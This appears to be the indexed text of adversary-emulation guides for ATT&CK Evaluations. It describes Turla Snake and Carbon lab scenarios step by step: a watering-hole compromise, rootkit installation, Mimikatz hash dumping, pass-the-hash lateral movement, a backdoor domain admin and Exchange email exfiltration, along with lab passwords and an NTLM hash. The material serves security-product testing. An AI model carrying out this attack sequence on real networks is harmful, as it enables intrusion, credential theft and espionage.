provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Turla - Snake (Emu), which is the fact source for the Turla adversary. From there, update the following facts as needed:","domain.admin.ntlm: The NTLM of a domain admin.","domain.admin.user: The username of a domain admin.","file.server.admin: The username of the file server admin.","first.epic.id: The first EPIC implant ID.","first.snake.id: The first Snake implant ID.","first.target.ip: The IP address of the first target host.","first.target.password: The password of the first target host.","first.target.user: The username of the first target host.","fourth.target.host: The hostname of the fourth target host.","Generally, it’s only possible to task a Caldera agent which is alive and actively checking in with the Caldera server. However, due to the integration between the evalsc2client.py and the Caldera Emu plugin in this port, the user is effectively tasking the Sandcat agent to task evalsc2client.py to task an implant through the Control Server, which makes it possible to task an implant that is not active. Therefore, a Caldera requirement was implemented to prevent an ability from executing if the implant tasked in that ability was not actively beaconing in. This requirement uses the facts for the EPIC and Snake implant IDs, which are listed above.","lightneuron.implant.id: The Lightneuron implant ID.","network.domain.name: The network domain name for initial target system.","new.domain.password: The password of the new domain user.","new.domain.user: The username of the new domain user.","second.snake.id: The second Snake implant ID.","second.target.host: The hostname of the second target host.","second.target.ip: The IP address of the second target host.","second.target.password: The password of the second target host.","second.target.user: The username of the second target host.","third.snake.id: The third Snake implant ID.","third.target.host: The hostname of the third target host.","third.target.ip: The IP address of the third target host.","third.target.password: The password of the third target host.","third.target.user: The username of the third target host."]},{"l":"RUNNING THE OPERATION","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Turla - Snake (Turla).","For the Fact Source, select Turla - Snake (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select the atomic planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["To remove artifacts following operation, follow the Cleanup instructions for the Snake Scenario."]},{"l":"DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 11","p":["User executes NTFVersion.exe via Run prompt instead of double clicking from Downloads folder."]}],[{"i":"#","p":["The guide contains continued setup information for the Caldera port of the Turla Carbon scenario. If you have not yet set up Caldera, please refer to the initial setup instructions first."]},{"l":"STARTING THE CONTROL SERVER","p":["On the attacker machine, open a new terminal window and run the following to start the C2 server:","Ensure that the Carbon & Epic handlers start up before continuing to the next step."]},{"l":"FACT SETUP","p":["apache.server.ip: The IP address of the Apache server.","attacker.host.ip: The IP address of the attacker's host.","Before running the operation, you will need to make sure that the Turla fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Turla - Carbon (Emu), which is the fact source for the Turla adversary. From there, update the following facts as needed:","first.carbon.id: The first Carbon implant ID.","first.epic.id: The first EPIC implant ID.","first.target.host: The hostname of the first target host.","first.target.ip: The IP address of the first target host.","first.target.password: The password of the first target host.","first.target.user: The username of the first target host.","Generally, it’s only possible to task a Caldera agent which is alive and actively checking in with the Caldera server. However, due to the integration between the evalsc2client.py and the Caldera Emu plugin in this port, the user is effectively tasking the Sandcat agent to task evalsc2client.py to task an implant through the Control Server, which makes it possible to task an implant that is not active. Therefore, a Caldera requirement was implemented to prevent an ability from executing if the implant tasked in that ability was not actively beaconing in. This requirement uses the facts for the EPIC and Carbon implant IDs, which are listed above.","network.domain.name: The network domain name for initial target system.","second.carbon.id: The second Carbon implant ID.","second.epic.id: The second EPIC implant ID.","second.target.host: The hostname of the second target host.","second.target.ip: The IP address of the second target host.","second.target.password: The password of the second target host.","second.target.user: The username of the second target host.","third.carbon.id: The third Carbon implant ID.","third.target.host: The hostname of the third target host.","third.target.ip: The IP address of the third target host.","third.target.ntlm: The NTLM hash for the third target user.","third.target.password: The password of the third target host.","third.target.user: The username of the third target host."]},{"l":"RUNNING THE OPERATION","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Turla - Carbon (Turla).","For the Fact Source, select Turla - Carbon (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select the atomic planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["To remove artifacts following operation, follow the Cleanup instructions for the Carbon Scenario."]},{"l":"DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 1","p":["Rather than navigating to https://brieftragerin.skt.local/owa, logging in, and clicking the link in the email from noreply@sktlocal.it, the port will download NTFVersion.exe by navigating directly to http://anto-int.com/NTFVersion.exe in the Edge browser."]},{"l":"Step 8","p":["The password Password2! is hardcoded into the ability to ssh into the Apache server. If your password is not Password2!, you will need to edit the xdotool commands in the ability named \"Adalwolfa types keylogged data (User)\" to include your specific password.","The port does not include Adalwolfa opening the Edge browser and navigating to http://kagarov/index.html. It also does not include Adalwolfa editing the /var/www/html/index.html file."]}],[{"l":"Snake Scenario","p":["For ATT&CK Evaluations Enterprise Round 5, the Snake scenario was developed to emulate Turla's utilization of the following software:","Epic","Snake","PsExec","Mimikatz","LightNeuron"]},{"l":"Detections Scenario","p":["This 9 step scenario was created for the Detections portion of ATT&CK Evaluations Enterprise Round 5, where all prevention mechanisms and protection tooling is disabled to allow the full emulation plan to execute unobstructed. This allows the scenario to be executed from beginning to end, with each step building upon the previous. and for telemetry on red team activity to be gathered in full."]},{"l":"Protections Scenario","p":["The scenario created for the Detections portion was modularized into 6 discrete tests to create the Protections portion of ATT&CK Evaluations Enterprise Round 5, where prevention mechanisms and protection tooling is enabled. This highlights protection capabilities of the deployed solution and encourages blocks of red team activity as early as possible. For this reason, this version of the scenario was designed to removes the dependencies between each step."]},{"l":"Infrastructure","p":["This scenario was executed on the following infrastructure:","Snake Infrastructure Diagram","Reference setup for guidance on deploying the infrastructure used by this scenario."]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","❗ - extremely important note","➡️ - Switching to another session","⭕ - Sign out of something"]},{"l":"Setup","p":["➡️ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Ensure the EPIC, Snake, and LightNeuron handlers started up."]},{"i":"step-11---initial-compromise-and-establish-foothold","l":"Step 11 - Initial Compromise and Establish Foothold","p":["\uD83C\uDFA4 Voice Track:","Step 11 emulates Turla gaining initial access via a watering hole attack targeting user Egle.","Egle visits a legitimate, but compromised website. This website redirects Egle to a duplicated, malicious version of the compromised website hosted on an adversary server containing javascript (JS) that fingerprints their machine in the background and installs an evercookie on their browser.","This malicious WordPress website prompts Egle with a notice to update their NotFlash. Egle clicks to download the update, NFVersion_5e.exe, containing EPIC (a.k.a. Tavdig/Wipbot).","The execution flow of EPIC follows the same execution flow of EPIC in the Carbon scenario. The only difference with this scenario's version of EPIC is it communicates over HTTPS instead.","Once C2 communications have been established between EPIC and the C2 via the proxy server, discovery is performed on the first host where information about the host device and domain computers is collected."]},{"i":"biohazard-procedures","l":":biohazard: Procedures","p":["➡️ RDP to Azuolas (10.100.40.103) as Egle:","➡️ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","After redirection you will prompted to update NotFlash. Click to download the update ( NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot).","Close out of all tabs and sign out of your RDP session.","In your lower terminal tab, task the EPIC implant with the following set of discovery commands:","nk\\Egle","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Once the download has been completed, click the downloaded binary to execute it.","Open Microsoft Edge and browse to https://drebule.nk.local/owa. Log in as Egle:","Open Microsoft Edge and browse to nato-int.com.","Password","Producer1!","Re-RDP to Azuolas (10.100.40.103) as Egle:","Username","Wait 1 minute for it to finish running.","Wait for redirection to anto-int.com.","Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","Browser evercookie (utilized built-in BeEF Evercookie from the Browser Exploitation Framework)","Browser redirection","bzip2 compressed","C2 communications are over HTTPS, HTTPS specific flags","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Dropper","EPIC Guard","EPIC Injector","EPIC Payload(in msedge.exe)","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File write of EPIC injector","Fingerprinting details","Registry modification","RSA encrypted AES key","Targeting explorer.exe for DLL injection","Targeting svchost.exe for payload DLL injection","User discovery GetAllUsers","Watering Hole","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/","https://github.com/samyk/evercookie"]},{"i":"step-12---rootkit-installation","l":"Step 12 - Rootkit Installation","p":["\uD83C\uDFA4 Voice Track:","Step 12 emulates Turla exploiting a vulnerable driver to install the Snake rootkit on the Azuolas (10.100.40.103) system.","The existing EPIC implant, running under the context of Egle, will be used to download the Snake installer to the local machine and execute the installer as second stage malware. The Snake installer will escalate privileges to SYSTEM by exploiting a Windows 10 vulnerability. Once running as SYSTEM, the installer will disable DSE by loading and exploiting a vulnerable driver. Once DSE is disabled, the installer will load the Snake rootkit driver.","The rootkit driver will hook various functions and will inject a user-mode DLL into a SYSTEM process to execute received tasks from the C2 server. The driver will then wait for a browser process to make a network request to inject the user-mode DLL into the browser for C2 communications over HTTP. The injected DLLs will communicate between each other via named pipes.","At some point, Egle will browse to a website, triggering the rootkit driver to inject the user-mode DLL into the browser process - this DLL will begin communication with the C2 server over HTTP."]},{"i":"biohazard-procedures-1","l":":biohazard: Procedures","p":["In your Kali C2 server, ensure that you are in the lower split terminal window.","Task the EPIC implant to download the Snake rootkit installer.","Wait 1 minute after the payload is sucessfully downloaded before tasking the implant to execute the Snake rootkit installer with the privilege escalation option:","➡️ Switch to your RDP session in azuolas (10.100.40.103) and go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R.","➡️ Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","EPIC","Execute commands ExecCmd","File download DownloadFile","Function Hooking","Infinity Hook","Inject Usermodule DLL","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 9: Securelist/Artemon- Uroburos","Report 10: BAE/Artemon- Snake","Report 11: GData- Uroburos","Report 12: CIRCL- TR-25","Report 13: GData- Kernel Protection Mitigation","Report 14: GData- using WinDbg","Report 16: GData- Project Cobra","Report 17: Tetrane- Uroburos with REVEN","Report 18: Talos- Snake Campaign","Report 19: Lastline- Dissecting Turla Rootkit","Report 20: Lastline- Kernel Exploit Makeover","Report 27: GitHub- hfiref0x/TDL","Report 28: CoreLabs- VirtualBox Privilege Escalation","Report 29: Unit42- Acidbox"]},{"i":"step-13---first-workstation-discovery","l":"Step 13 - First Workstation Discovery","p":["\uD83C\uDFA4 Voice Track:","Step 13 emulates Turla performing discovery on the first workstation to discover a file server and associated file server admin.","The Snake rootkit receives tasking from the C2 server to enumerate currently running processes on the local computer and finds that EgleAdmin also has processes running. Further enumeration of the EgleAdmin user shows that it is a member of the File Server Admins group. Snake then impersonates Egle to enumerate mapped drives on the local machine and discovers Egle's home drive is actively mapped to the file server."]},{"i":"biohazard-procedures-2","l":":biohazard: Procedures","p":["❗ Verify that File Server Admins is listed as one of the groups that EgleAdmin is a member of.","❗ Verify that the enumerated processes output contains a process running under EgleAdmin","❗ Verify that the home drive is mapped to the file server host berzas( 10.100.30.204).","➡️ Return to your Kali C2 server.","➡️ Return to your RDP session to azuolas (10.100.40.103) as Egle.","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\EgleAdmin:","From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:","nk\\EgleAdmin","Open up a powershell terminal and run the following command:","Password","Producer1!","This should return output similar to the following:","Username","Wait 1 minute then execute the next discovery command to enumerate EgleAdmin's groups:","Wait 1 minute then execute the next discovery command to the drive mapped to the file server:","When prompted, type in the password for EgleAdmin:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Task download","Task execution with optional token impersonation","Token duplication"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"step-14---lateral-movement-to-file-server","l":"Step 14 - Lateral Movement to File Server","p":["\uD83C\uDFA4 Voice Track:","Step 14 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it.","Using the information discovered in the previous step, Snake impersonates the EgleAdmin account to run PsExec and execute another copy of the Snake rootkit installer on the file server. This new copy of the Snake installer will have the installed rootkit beacon back to the C2 server via a different redirector."]},{"i":"biohazard-procedures-3","l":":biohazard: Procedures","p":["Tasking the implant to download PsExec.","Wait 1 minute and then run the following command to download the snake installer:","Wait 1 minute before running the following command to execute PsExec as EgleAdmin, which will run the Snake installer on the file server berzas (10.100.30.204):","➡️ Go back to your RDP session to Azuolas (10.100.40.103) as Egle.","Minimize the RDP window.","➡️ RDP into berzas( 10.100.30.204) as EgleAdmin:","Username","Password","nk\\EgleAdmin","Producer1!","Close any spurious windows","Open Edge and navigate to https://www.google.com. Perform a search on File server configuration best practices, but don't click on any results.","Minimize the RDP window, keeping processes running.","➡️ Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","Wait 1 minute before running the following command to remove files from Azuolas (10.100.40.103):"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Disable DSE and Load Rootkit","Driver","Drop DLL","Function Hooking","Generic process execution with optional token impersonation","Infinity Hook","Inject Usermodule DLL","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution via cmd","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"step-15---domain-discovery","l":"Step 15 - Domain Discovery","p":["\uD83C\uDFA4 Voice Track:","Step 15 emulates Turla using Powershell to perform Active Directory user, group, and computer discovery.","The Snake rootkit receives tasking from the C2 server to use Powershell's ActiveDirectory module to enumerate domain users, admin groups, and computers. Upon discovering Zilvinas's regular and domain admin accounts, Snake will enumerate further details on the accounts. Snake then discovers a workstation belonging to Zilvinas to use as a future lateral movement target."]},{"i":"biohazard-procedures-4","l":":biohazard: Procedures","p":["From your lower Kali C2 control server terminal window, task Snake to check if the ActiveDirectory PowerShell module is installed.","❗ Verify that you see output. If the implant returns empty output, please contact your lead.","Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word \"management\", as members of these groups will likely have elevated permissions on the network.","❗ Verify that Server Management is included in the results.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla on users to target next.","❗ Verify that ZilvinasAdmin shows up in the list of accounts.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Domain Admins domain group.","Wait 1 minute before tasking Snake to discover domain users. Ensure Zilvinas and ZilvinasAdmin appear in the output.","Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).","❗ Ensure that Zilvinas' Workstation appears in the Description field for uosis"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Task download","Powershell execution"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-16---preparation-for-lateral-movement-to-admin-workstation","l":"Step 16 - Preparation for Lateral Movement to Admin Workstation","p":["\uD83C\uDFA4 Voice Track:","Step 16 emulates Turla performing credential dumping on the file server with the goal of moving laterally to a workstation owned by a Domain Admin.","Snake downloads Mimikatz to the file server and extracts all NTLM hashes on the target. The command output is sent directly to the C2 server."]},{"i":"biohazard-procedures-5","l":":biohazard: Procedures","p":["From the Kali C2 server lower terminal window, task Snake to download Mimikatz to the file server:","Wait 1 minute and then instruct Snake to download PsExec to the file server:","Wait 1 minute and then run the following command to download the snake installer:","Wait 1 minute and then instruct Snake to run Mimikatz to dump all NTLM hashes from LSASS.exe:","❗ Verify that the password Producer2! and NTLM hash f3fcd61f987a97da49ce5f650b4e6539 for ZilvinasAdmin appears at least once in the output.","This should return:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Snake Usermodule DLL","Payload download","Generic process execution","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-17---lateral-movement-to-admin-workstation-and-persistence","l":"Step 17 - Lateral Movement to Admin Workstation and Persistence","p":["\uD83C\uDFA4 Voice Track:","Step 17 emulates Turla performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account.","The retrieved NTLM hash discovered in the previous step is used in a pass-the-hash attack to move laterally to Zilvinas's workstation. PsExec is used via pass-the-hash to execute and install the Snake rootkit on the target workstation.","Once the admin workstation has been compromised, Snake is used to enumerate processes running on Zilvinas's workstation uosis, where it is discovered that ZilvinasAdmin has processes running which can be used for token impersonation. By impersonating ZilvinasAdmin, a new domain user Leshy is created and added to the Domain Admins domain group for persistence."]},{"i":"biohazard-procedures-6","l":":biohazard: Procedures","p":["❗ Verify that we find processes running under ZilvinasAdmin","➡️ Return to the Kali C2 server","➡️ Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.","➡️ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","➡️ Wait 2 minutes. Start a new RDP session to uosis( 10.100.40.102) as Zilvinas:","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\ZilvinasAdmin:","Click on the search bar and search for powershell. Right click powershell and then click \"Run as Administrator\".","From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under ZilvinasAdmin.","Instruct Snake to pass-the-hash using ZilvinasAdmin's NTLM hash to run PsExec and install Snake on the target workstation.","nk\\Zilvinas","nk\\ZilvinasAdmin","Open Edge and navigate to https://drebule.nk.local/owa. Log in as Zilvinas:","Password","Producer2!","Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.","This should return output similar to the following:","Username","Wait 1 minute and then task the implant to delete artifacts from the file server.","Wait 1 minute, then instruct Snake to add Leshy to the Domain Admins group.","Wait 1 minute, then instruct Snake to create a new domain user Leshy using an access token from one of the ZilvinasAdmin processes. Leshy will be used as a backdoor domain admin account for persistence on the domain.","When prompted, type in the username and password for ZilvinasAdmin:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","File Upload","Function Hooking","Infinity Hook","Inject Usermodule DLL","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution for generic process","Task execution via cmd with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-18---lateral-movement-to-exchange-server","l":"Step 18 - Lateral Movement to Exchange Server","p":["\uD83C\uDFA4 Voice Track:","Step 18 emulates Turla laterally moving to the Exchange server and installing the LightNeuron implant there.","Snake downloads LightNeuron and associated Powershell installation script and config files, transfers them to the Exchange server, and remotely executes the installation script using WMI to install LightNeuron on the Exchange server."]},{"i":"biohazard-procedures-7","l":":biohazard: Procedures","p":["From the Kali C2 lower terminal window, task Snake to download LightNeuron:","Wait 1 minute and then task Snake to download the companion DLL for LightNeuron:","Wait 1 minute and then task Snake to download the Powershell installation script for LightNeuron.","Wait 1 minute and then task Snake to download the LightNeuron email rules file.","Wait 1 minute and then task Snake to download the LightNeuron config file.","Wait 1 minute and then task Snake to copy LightNeuron, the rules config file, and the Powershell installation script to the remote target drebule, using token impersonation to perform the copy as ZilvinasAdmin.","Wait 1 minute before copying the next file:","Wait 1 minute before copying the rules file:","Wait 1 minute before copying the last config file:","Wait 1 minute and then task Snake to install LightNeuron remotely using WMI and Powershell, using ZilvinasAdmin's token","❗ Verify that the WMIC output shows a ReturnValue of 0.","Wait 1 minute and then task Snake to check the installation log for any errors:","Expected output will start with messages regarding PS-Session, the bottom of the file should look like:","❗ If the output contains any errors, notify your lead.","Wait 1 minute and then task Snake to remove artifacts from uosis (10.100.40.102):"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Installation Script","LightNeuron","Masquerading legitimate file name","Snake Usermodule DLL","Task download","Task execution for generic process with optional token impersonation","Task execution via cmd with optional token impersonation","Payload download","Token duplication"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"step-19---discovery-and-email-collection","l":"Step 19 - Discovery and Email Collection","p":["\uD83C\uDFA4 Voice Track:","Step 19 emulates Turla sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic.","Emails with JPG attachments containing AES encrypted commands embedded using stegonagraphy are sent from the C2 server to the domain. LightNeuron's transport agent processes all emails via LightNeuron's companion DLL, which executes the embedded command and blocks delivery of the email from the C2 server.","LightNeuron automatically collects all emails with recipients matching nk.local in a log file ( C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml).","Eventually, LightNeuron is tasked to exfiltrate the email log, which is exfiltrated over the existing C2 channel."]},{"i":"biohazard-procedures-8","l":":biohazard: Procedures","p":["❗ If no response is received after 5 minutes, check the postfix logs on the Kali server to make sure the email was intercepted and processed correctly by LightNeuron.","➡️ Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:","➡️ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","➡️ Switch to your RDP window to Azuolas( 10.100.40.103) as Egle.","Create a new email:","From the Kali C2 lower terminal window, task LightNeuron to perform system network configuration discovery:","Go to your Edge browser window with the OWA page. Your windows should still be up from Step 6.","Go to your Edge browser window. You should still be logged into OWA from Step 2.","If there is a reject entry, that means the email, destined for a nonexistent user, was processed by the Exchange server, meaning that LightNeuron was either not successfully installed or is not working properly.","Reply to the email from Zilvinas.","Send the email","The email recipient should be the user egle@nk.local","The email subject should be SAP Integration Issue","The file contents will be logged by the control server.❗ Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:","The following text should be pasted in as the email body:","The following text should be pasted in as the email reply body:","You should see the email from Zilvinas@nk.local. Try reloading the page if needed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Analyze attachment for data from C2","Automated Collection","Check message against rule file","Check signature in image","Companion DLL","Data Staging/Automated Collection","Decode attachment data from base64","Decrypt data in image","Email Hiding Rules","Encode data in base64","Encrypt result of command in image","Execute commands: Cmd ID 3","Execute commands: Cmd ID 5","Extract task from image","Hide result of command in image","Remote Email Collection","Send message back to C2 server over email","Steganography","Transport Agent"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]}],[{"l":"Snake Protections Scenario","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","❗ - extremely important note","➡️ - Switching to another session","⭕ - Sign out of something"]},{"l":"Protections Setup","p":["➡️ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Ensure the EPIC, Snake, and LightNeuron handlers started up.","Within your Kali control server terminal window, right click and select\"Split Terminal Horizontally\". Be careful not to terminate the control server.","In the new terminal window, change directory to the control server repo:"]},{"i":"test-8-watering-hole","l":"Test 8: Watering Hole","p":["\uD83C\uDFA4 Voice Track:","Test 8 emulates Turla's initial access attempt via a watering hole attack targeting user Egle, who downloads the EPIC dropper."]},{"i":"biohazard-procedures","l":":biohazard: Procedures","p":["➡️ RDP to Azuolas (10.100.40.103) as Egle:","Username","Password","nk\\Egle","Producer1!","Open Microsoft Edge and browse to nato-int.com.","Wait for redirection to anto-int.com.","After redirection you will prompted to update NotFlash. Click to download the update ( NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot). ❗ DO NOT EXECUTE THE FILE.","Open File Explorer and browse to Downloads"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Watering Hole","Browser redirection","Browser evercookie (utilized built-in BeEF Evercookie from the Browser Exploitation Framework)","Fingerprinting details"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/","https://github.com/samyk/evercookie"]},{"i":"test-9-execute-epic","l":"Test 9: Execute EPIC","p":["\uD83C\uDFA4 Voice Track:","Test 9 emulates execution of the EPIC installer to achieve initial access and perform some discovery via the EPIC implant."]},{"i":"biohazard-procedures-1","l":":biohazard: Procedures","p":["➡️ Return to your Kali C2 server","➡️ Return to your RDP session as Egle","➡️ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","Close out of all tabs and sign out of your RDP session.","Double click on the downloaded NFVersion_5e.exe to run it.","In your lower terminal tab, task the EPIC implant with the following set of discovery commands:","nk\\Egle","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Open a new terminal tab and name it smbclient. Copy the EPIC dropper executable to Windows host, Azuolas:","Open File Explorer > Downloads","Open Microsoft Edge and browse to https://drebule.nk.local/owa. Log in as Egle:","Password","Producer1!","Re-RDP to Azuolas (10.100.40.103) as Egle:","Username","Wait 1 minute for it to finish running.","Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","bzip2 compressed","C2 communications are over HTTPS, HTTPS specific flags","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Dropper","EPIC Guard","EPIC Injector","EPIC Payload(in msedge.exe)","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File write of EPIC injector","Registry modification","RSA encrypted AES key","Targeting explorer.exe for DLL injection","Targeting svchost.exe for payload DLL injection","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited 